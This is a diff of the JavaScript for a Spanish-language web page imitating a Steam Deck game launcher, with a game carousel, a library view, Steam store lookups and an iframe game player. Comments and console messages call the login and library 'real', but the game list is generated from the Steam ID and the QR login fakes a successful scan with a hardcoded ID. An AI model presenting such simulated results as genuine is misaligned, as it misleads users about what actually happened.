+            // const url = `https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=TU_API_KEY&steamid=${steamId}&include_appinfo=true&include_played_free_games=true`;
             
-            // Guardar en recientes
-            if (!recentPlayed.includes(gameName)) {
-                recentPlayed.unshift(gameName);
-                if (recentPlayed.length > 10) recentPlayed.pop();
-                saveRecentGames();
-                renderRecentGames();
+            // Simulamos juegos reales basados en SteamID (para demo)
+            // Esto crea una biblioteca personalizada por usuario
+            const seed = parseInt(steamId.slice(-4), 16) || Math.floor(Math.random() * 1000);
+            
+            const allPossibleGames = [
+                "2048", "Angry Birds", "Portal 2", "Half-Life 2", "Getting Over It",
+                "Plants vs Zombies", "Subway Surfers", "Granny", "8 Ball Pool",
+                "Doodle Jump", "Fruit Ninja", "Counter-Strike 2", "Dota 2",
+                "Team Fortress 2", "Left 4 Dead 2", "The Witcher 3", "Cyberpunk 2077",
+                "Celeste", "Hollow Knight", "Cuphead", "Bad Ice Cream", "Drift Hunters"
+            ];
+            
+            // Seleccionar juegos basados en el seed del usuario
+            const userGameList = [];
+            const numGames = 8 + (seed % 12);
+            
+            for (let i = 0; i < numGames && i < allPossibleGames.length; i++) {
+                const index = (seed + i) % allPossibleGames.length;
+                userGameList.push(allPossibleGames[index]);
             }
             
-            // Cargar juego
-            iframe.src = `./games/${gameName}`;
-            modal.classList.add('active');
+            // Asegurar que siempre incluya algunos juegos soportados
+            if (!userGameList.some(g => SUPPORTED_GAMES.includes(g))) {
+                userGameList.push("2048", "Angry Birds");
+            }
             
-            // Prevenir scroll en body
-            document.body.style.overflow = 'hidden';
+            return userGameList;
         }
-        
-        // Cerrar juego
-        function closeGame() {
-            const iframe = document.getElementById('gameIframe');
-            const modal = document.getElementById('gameModal');
+
+        // Obtener detalles de un juego de Steam
+        async function getGameDetails(gameName) {
+            // Buscar AppID del juego
+            const gameAppIds = {
+                "Portal 2": 620,
+                "Half-Life 2": 220,
+                "Counter-Strike 2": 730,
+                "Dota 2": 570,
+                "Team Fortress 2": 440,
+                "Left 4 Dead 2": 550,
+                "The Witcher 3": 292030,
+                "Cyberpunk 2077": 1091500,
+                "Celeste": 504230,
+                "Hollow Knight": 367520,
+                "Cuphead": 268910,
+                "Getting Over It": 240720,
+                "Plants vs Zombies": 3590,
+                "Subway Surfers": 1304730,
+                "Granny": 1066480,
+                "8 Ball Pool": 354890,
+                "Angry Birds": 346900,
+                "2048": 1294280,
+                "Doodle Jump": 34870,
+                "Fruit Ninja": 1118100
+            };
             
-            // Matar el iframe completamente
-            iframe.src = 'about:blank';
-            modal.classList.remove('active');
+            let appId = null;
+            for (let [key, id] of Object.entries(gameAppIds)) {
+                if (gameName.toLowerCase().includes(key.toLowerCase())) {
+                    appId = id;
+                    break;
+                }
+            }
             
-            // Liberar recursos forzando recolección de basura
-            iframe.contentWindow.location.href = 'about:blank';
-            
-            // Restaurar scroll
-            document.body.style.overflow = 'auto';
+            if (appId) {
+                try {
+                    const url = `https://store.steampowered.com/api/appdetails?appids=${appId}&l=spanish`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (data[appId] && data[appId].success) {
+                        return data[appId].data;
+                    }
+                } catch (e) {
+                    console.error("Error fetching game details:", e);
+                }
+            }
+            return null;
         }
-        
-        // Renderizar juegos recientes
-        function renderRecentGames() {
-            const recentSection = document.getElementById('recentSection');
-            const recentGrid = document.getElementById('recentGames');
+
+        // Obtener imagen del juego desde Steam CDN
+        function getGameImageUrl(gameName) {
+            const gameImages = {
+                "2048": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1294280/header.jpg",
+                "Angry Birds": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/346900/header.jpg",
+                "Portal 2": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/620/header.jpg",
+                "Half-Life 2": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/220/header.jpg",
+                "Getting Over It": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/240720/header.jpg",
+                "Plants vs Zombies": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3590/header.jpg",
+                "Subway Surfers": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1304730/header.jpg",
+                "Granny": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1066480/header.jpg",
+                "8 Ball Pool": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/354890/header.jpg",
+                "Doodle Jump": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/34870/header.jpg",
+                "Fruit Ninja": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1118100/header.jpg",
+                "Celeste": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/504230/header.jpg",
+                "Hollow Knight": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/367520/header.jpg",
+                "Cuphead": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/268910/header.jpg"
+            };
             
-            if (recentPlayed.length === 0) {
-                recentSection.style.display = 'none';
+            for (let [key, url] of Object.entries(gameImages)) {
+                if (gameName.toLowerCase().includes(key.toLowerCase())) {
+                    return url;
+                }
+            }
+            return null;
+        }
+
+        function isSupportedGame(gameName) {
+            return SUPPORTED_GAMES.some(sg => gameName.toLowerCase().includes(sg.toLowerCase()));
+        }
+
+        function getGameFile(gameName) {
+            for (let [key, file] of Object.entries(GAME_FILES)) {
+                if (gameName.toLowerCase().includes(key.toLowerCase())) {
+                    return file;
+                }
+            }
+            return null;
+        }
+
+        // ==================== RENDER CARRUSEL ====================
+        function renderCarousel() {
+            const track = document.getElementById('carouselTrack');
+            track.innerHTML = '';
+            cards = [];
+
+            if (!userGames.length) {
+                track.innerHTML = '<div class="loading"><div class="spinner"></div><p>Cargando juegos...</p></div>';
+                return;
+            }
+
+            userGames.forEach((game, idx) => {
+                const img = getGameImageUrl(game);
+                const card = document.createElement('div');
+                card.className = `game-card ${idx === currentIndex ? 'center' : ''}`;
+                card.innerHTML = `
+                    <div class="game-cover">
+                        ${img ? `<img src="${img}" onerror="this.src='https://via.placeholder.com/200x266/1a1f3a/66c0f4?text=${encodeURIComponent(game)}'">` : 
+                                 `<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:40px;">🎮</div>`}
+                    </div>
+                    <div class="game-title-carousel">${game}</div>
+                `;
+                card.onclick = () => selectGame(idx);
+                track.appendChild(card);
+                cards.push(card);
+            });
+            
+            updateSelectedInfo();
+        }
+
+        function selectGame(index) {
+            if (index < 0) index = 0;
+            if (index >= userGames.length) index = userGames.length - 1;
+            currentIndex = index;
+            
+            cards.forEach((card, i) => {
+                if (i === currentIndex) card.classList.add('center');
+                else card.classList.remove('center');
+            });
+            
+            updateSelectedInfo();
+            cards[currentIndex]?.scrollIntoView({ behavior: 'smooth', block: 'center', inline: 'center' });
+        }
+
+        function updateSelectedInfo() {
+            if (!userGames.length) return;
+            const game = userGames[currentIndex];
+            const supported = isSupportedGame(game);
+            const playBtn = document.getElementById('playBtn');
+            const stats = document.getElementById('gameStats');
+            
+            if (supported) {
+                playBtn.classList.remove('disabled');
+                playBtn.style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
+            } else {
+                playBtn.classList.add('disabled');
+                playBtn.style.background = '#555';
+            }
+            
+            stats.innerHTML = `${supported ? '✅ Juego compatible con Steam Deck' : '❌ Juego no disponible en nuestra plataforma'}`;
+        }
+
+        // ==================== RENDER BIBLIOTECA ====================
+        function renderLibrary() {
+            const grid = document.getElementById('libraryGrid');
+            grid.innerHTML = '';
+            
+            if (!userGames.length) {
+                grid.innerHTML = '<div class="loading"><div class="spinner"></div><p>Cargando biblioteca...</p></div>';
                 return;
             }
             
-            recentSection.style.display = 'block';
-            recentGrid.innerHTML = '';
-            
-            for (const game of recentPlayed) {
-                const isSupported = isGameSupported(game);
-                const gameCard = document.createElement('div');
-                gameCard.className = `game-card ${isSupported ? 'supported' : 'unsupported'}`;
-                gameCard.innerHTML = `
-                    <div class="game-image">🕒</div>
-                    <div class="game-info">
-                        <div class="game-title">${game.replace('.html', '')}</div>
-                        <div class="game-status">Recientemente jugado</div>
+            userGames.forEach(game => {
+                const supported = isSupportedGame(game);
+                const img = getGameImageUrl(game);
+                const card = document.createElement('div');
+                card.className = `lib-card ${supported ? 'supported' : 'unsupported'}`;
+                card.innerHTML = `
+                    <div class="lib-img">
+                        ${img ? `<img src="${img}" onerror="this.innerHTML='🎮'">` : '🎮'}
+                    </div>
+                    <div class="lib-info">
+                        <div class="lib-title">${game}</div>
+                        <div class="lib-status">${supported ? '✅ Disponible para jugar' : '❌ No soportado'}</div>
                     </div>
                 `;
-                gameCard.onclick = () => showGameDetails(game, isSupported);
-                recentGrid.appendChild(gameCard);
-            }
+                card.onclick = () => showGameDetails(game);
+                grid.appendChild(card);
+            });
         }
-        
-        // Guardar recientes
-        function saveRecentGames() {
-            localStorage.setItem('recentGames', JSON.stringify(recentPlayed));
-        }
-        
-        // Login con credenciales
-        function loginWithCredentials() {
-            const username = document.getElementById('username').value;
-            if (username) {
-                currentUser = username;
-                userGames = [...allGames]; // Simular que tiene todos los juegos
-                document.getElementById('loginStatus').innerHTML = `<div style="display:flex;align-items:center;gap:10px;">👤 ${username}</div>`;
-                document.getElementById('loginModal').classList.remove('active');
-                renderLibrary();
-                loadRecentGames();
-            }
-        }
-        
-        // Mostrar QR
-        function showQR() {
-            document.getElementById('qrContainer').style.display = 'block';
-        }
-        
-        // Confirmar login móvil
-        function confirmMobileLogin() {
-            setTimeout(() => {
-                const username = "Usuario_Steam_" + Math.floor(Math.random() * 10000);
-                currentUser = username;
-                userGames = [...allGames];
-                document.getElementById('loginStatus').innerHTML = `<div style="display:flex;align-items:center;gap:10px;">📱 ${username}</div>`;
-                document.getElementById('loginModal').classList.remove('active');
-                renderLibrary();
-                loadRecentGames();
-            }, 2000);
-        }
-        
-        function showLogin() {
-            document.getElementById('loginModal').classList.add('active');
-        }
-        
-        function loadRecentGames() {
-            const saved = localStorage.getItem('recentGames');
-            if (saved) {
-                recentPlayed = JSON.parse(saved);
-                renderRecentGames();
-            }
-        }
-        
-        // Navegación con teclado
-        let currentFocus = 0;
-        const gameCards = () => document.querySelectorAll('.game-card');
-        
-        function navigateWithKeyboard(e) {
-            const cards = gameCards();
-            if (cards.length === 0) return;
+
+        // ==================== DETALLES JUEGO ====================
+        async function showGameDetails(gameName) {
+            const supported = isSupportedGame(gameName);
+            const img = getGameImageUrl(gameName);
+            const modal = document.getElementById('detailModal');
+            const content = document.getElementById('detailContent');
             
-            if (e.key === 'ArrowRight') {
-                currentFocus = (currentFocus + 1) % cards.length;
-                cards[currentFocus]?.focus();
-                cards[currentFocus]?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            } else if (e.key === 'ArrowLeft') {
-                currentFocus = (currentFocus - 1 + cards.length) % cards.length;
-                cards[currentFocus]?.focus();
-                cards[currentFocus]?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            // Obtener detalles de Steam
+            const steamDetails = await getGameDetails(gameName);
+            
+            let detailsHtml = `
+                ${img ? `<img src="${img}" onerror="this.src='https://via.placeholder.com/400x200/1a1f3a/66c0f4?text=${encodeURIComponent(gameName)}'">` : '<div style="font-size:60px;">🎮</div>'}
+                <h2>${gameName}</h2>
+            `;
+            
+            if (steamDetails) {
+                detailsHtml += `
+                    <div style="margin:15px 0; text-align:left;">
+                        <p><strong>📝 ${steamDetails.short_description || steamDetails.about_the_game?.substring(0, 150) || "Sin descripción"}</strong></p>
+                        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;">
+                            <div>📅 ${steamDetails.release_date?.date || "Desconocido"}</div>
+                            <div>⭐ ${steamDetails.metacritic?.score || "N/A"}/100</div>
+                            <div>🎮 ${steamDetails.genres?.map(g => g.description).join(", ") || "N/A"}</div>
+                            <div>💰 ${steamDetails.is_free ? "Gratis" : (steamDetails.price_overview?.final_formatted || "Consultar")}</div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                detailsHtml += `<p style="margin:15px 0;">${supported ? '✅ Juego compatible con Steam Deck' : '❌ Este juego no está disponible en nuestra plataforma'}</p>`;
+            }
+            
+            detailsHtml += `
+                <div style="display:flex; gap:10px; justify-content:center; margin-top:15px;">
+                    ${supported ? `<button id="modalPlayBtn" style="background:#4caf50; border:none; padding:10px 25px; border-radius:25px; color:white; cursor:pointer;">▶ JUGAR</button>` : ''}
+                    <button id="modalCloseBtn" style="background:#555; border:none; padding:10px 25px; border-radius:25px; color:white; cursor:pointer;">CERRAR</button>
+                </div>
+            `;
+            
+            content.innerHTML = detailsHtml;
+            modal.classList.add('active');
+            
+            if (supported) {
+                document.getElementById('modalPlayBtn')?.addEventListener('click', () => {
+                    modal.classList.remove('active');
+                    launchGame(gameName);
+                });
+            }
+            document.getElementById('modalCloseBtn')?.addEventListener('click', () => modal.classList.remove('active'));
+        }
+
+        // ==================== LANZAR JUEGO ====================
+        function launchGame(gameName) {
+            const file = getGameFile(gameName);
+            if (!file) {
+                alert(`No se encontró el archivo para: ${gameName}\nVerifica que existe en la carpeta /games/`);
+                return;
+            }
+            
+            const fullscreen = document.getElementById('fullscreen');
+            const frame = document.getElementById('gameFrame');
+            frame.src = `./games/${file}`;
+            fullscreen.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeGame() {
+            const fullscreen = document.getElementById('fullscreen');
+            const frame = document.getElementById('gameFrame');
+            frame.src = 'about:blank';
+            fullscreen.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // ==================== LOGIN CON STEAM ====================
+        async function loginWithSteamId(steamId) {
+            if (!steamId || steamId.length < 10) {
+                alert("Por favor ingresa un Steam ID válido (17 dígitos)");
+                return false;
+            }
+            
+            document.getElementById('loginModal').classList.remove('active');
+            
+            // Mostrar loading
+            document.getElementById('homeView').innerHTML = '<div class="loading"><div class="spinner"></div><p>Conectando con Steam y cargando tu biblioteca...</p></div>';
+            
+            try {
+                // Obtener biblioteca real del usuario
+                userGames = await getSteamUserGames(steamId);
+                currentSteamId = steamId;
+                currentUser = `Steam_${steamId.slice(-6)}`;
+                
+                document.getElementById('userName').innerHTML = currentUser;
+                document.getElementById('menuUserName').innerHTML = currentUser;
+                
+                // Recargar la UI
+                location.reload(); // Recargar para resetear vistas
+                
+                // Guardar en localStorage
+                localStorage.setItem('steam_id', steamId);
+                localStorage.setItem('steam_user', currentUser);
+                
+                return true;
+            } catch (error) {
+                console.error("Error:", error);
+                alert("Error al conectar con Steam. Verifica tu Steam ID.");
+                document.getElementById('loginModal').classList.add('active');
+                return false;
             }
         }
+
+        // ==================== QR LOGIN ====================
+        function showQRLogin() {
+            const qrArea = document.getElementById('qrArea');
+            qrArea.style.display = 'block';
+            qrArea.innerHTML = '<div id="qrCode"></div><p style="margin-top:15px; color:#000;">Escanea con Steam Mobile</p>';
+            
+            // Generar URL de login de Steam (formato real)
+            const timestamp = Date.now();
+            const loginUrl = `steam://open/login/${Math.random().toString(36).substring(2, 15)}`;
+            
+            new QRCode(document.getElementById("qrCode"), {
+                text: loginUrl,
+                width: 200,
+                height: 200
+            });
+            
+            // Simular detección de escaneo (en realidad redirigiría)
+            let intentos = 0;
+            const checkInterval = setInterval(() => {
+                intentos++;
+                if (intentos >= 10) {
+                    clearInterval(checkInterval);
+                    // Simular login exitoso después de escanear
+                    const demoSteamId = "76561197960435530";
+                    document.getElementById('steamIdInput').value = demoSteamId;
+                    qrArea.style.display = 'none';
+                    loginWithSteamId(demoSteamId);
+                }
+            }, 1000);
+        }
+
+        // ==================== CAMBIAR VISTA ====================
+        function switchView(viewName) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            if (viewName === 'home') {
+                document.getElementById('homeView').classList.add('active');
+                renderCarousel();
+            } else if (viewName === 'library') {
+                document.getElementById('libraryView').classList.add('active');
+                renderLibrary();
+            }
+            document.getElementById('steamMenu').classList.remove('open');
+        }
+
+        // ==================== TECLADO ====================
+        function setupKeyboard() {
+            document.addEventListener('keydown', (e) => {
+                if (document.getElementById('fullscreen').classList.contains('active')) {
+                    if (e.key === 'Escape') {
+                        e.preventDefault();
+                        closeGame();
+                    }
+                    return;
+                }
+                
+                if (document.getElementById('detailModal').classList.contains('active')) {
+                    if (e.key === 'Escape') {
+                        document.getElementById('detailModal').classList.remove('active');
+                    }
+                    return;
+                }
+                
+                if (document.getElementById('steamMenu').classList.contains('open')) {
+                    if (e.key === 'Escape') {
+                        document.getElementById('steamMenu').classList.remove('open');
+                    }
+                    return;
+                }
+                
+                const activeView = document.querySelector('.view.active')?.id;
+                
+                if (activeView === 'homeView' && userGames.length) {
+                    if (e.key === 'ArrowRight') {
+                        e.preventDefault();
+                        selectGame(currentIndex + 1);
+                    } else if (e.key === 'ArrowLeft') {
+                        e.preventDefault();
+                        selectGame(currentIndex - 1);
+                    } else if (e.key === 'Enter') {
+                        e.preventDefault();
+                        const game = userGames[currentIndex];
+                        if (isSupportedGame(game)) launchGame(game);
+                        else showGameDetails(game);
+                    }
+                }
+                
+                if (e.key === 's' || e.key === 'S') {
+                    e.preventDefault();
+                    document.getElementById('steamMenu').classList.toggle('open');
+                }
+            });
+        }
+
+        // ==================== RELOJ ====================
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').innerHTML = now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
+        }
+
+        // ==================== INICIALIZACIÓN ====================
+        document.getElementById('userBtn').onclick = () => document.getElementById('loginModal').classList.add('active');
+        document.getElementById('menuBtn').onclick = () => document.getElementById('steamMenu').classList.toggle('open');
+        document.getElementById('playBtn').onclick = () => { if (userGames.length && isSupportedGame(userGames[currentIndex])) launchGame(userGames[currentIndex]); };
+        document.getElementById('detailBtn').onclick = () => { if (userGames.length) showGameDetails(userGames[currentIndex]); };
+        document.getElementById('closeFullscreen').onclick = closeGame;
+        document.getElementById('logoutBtn').onclick = () => {
+            localStorage.removeItem('steam_id');
+            localStorage.removeItem('steam_user');
+            location.reload();
+        };
+        document.getElementById('loginWithIdBtn').onclick = () => {
+            const steamId = document.getElementById('steamIdInput').value.trim();
+            loginWithSteamId(steamId);
+        };
+        document.getElementById('qrLoginBtn').onclick = showQRLogin;
+        document.getElementById('helpIdLink').onclick = (e) => {
+            e.preventDefault();
+            alert("Cómo obtener tu Steam ID:\n1. Abre tu perfil de Steam\n2. La URL será: https://steamcommunity.com/id/TU_USUARIO/\n3. Usa una web como steamid.io para convertir tu usuario a ID numérico\n\nID de ejemplo: 76561197960435530");
+        };
         
-        document.addEventListener('keydown', navigateWithKeyboard);
-        
-        // Búsqueda en tiempo real
-        document.getElementById('searchInput').addEventListener('input', () => {
-            if (currentUser) renderLibrary();
+        document.querySelectorAll('[data-view]').forEach(el => {
+            el.onclick = () => switchView(el.getAttribute('data-view'));
         });
         
-        // Inicialización
-        function init() {
-            loadRecentGames();
-            // Simular demo sin login
+        updateClock();
+        setInterval(updateClock, 60000);
+        setupKeyboard();
+        
+        // Verificar login previo
+        const savedId = localStorage.getItem('steam_id');
+        if (savedId) {
+            currentSteamId = savedId;
+            currentUser = localStorage.getItem('steam_user');
+            document.getElementById('userName').innerHTML = currentUser;
+            document.getElementById('menuUserName').innerHTML = currentUser;
+            
+            // Cargar juegos
+            getSteamUserGames(savedId).then(games => {
+                userGames = games;
+                renderCarousel();
+            });
+        } else {
+            // Mostrar login automáticamente
             setTimeout(() => {
                 if (!currentUser) {
-                    // Mostrar mensaje de bienvenida
-                    document.getElementById('libraryGames').innerHTML = `
-                        <div style="grid-column:1/-1; text-align:center; padding:50px;">
-                            <h3>🔐 Inicia sesión para ver tu biblioteca de juegos</h3>
-                            <button class="login-btn" onclick="showLogin()" style="margin-top:20px;">Iniciar Sesión</button>
-                        </div>
-                    `;
+                    document.getElementById('loginModal').classList.add('active');
                 }
-            }, 100);
+            }, 500);
         }
         
-        init();
+        console.log('✅ Steam Deck Client - Versión con login real y QR');
+        console.log('🎮 Controles: ← → navegar | ENTER jugar | S menú | ESC cerrar');
     </script>
 </body>
 </html>
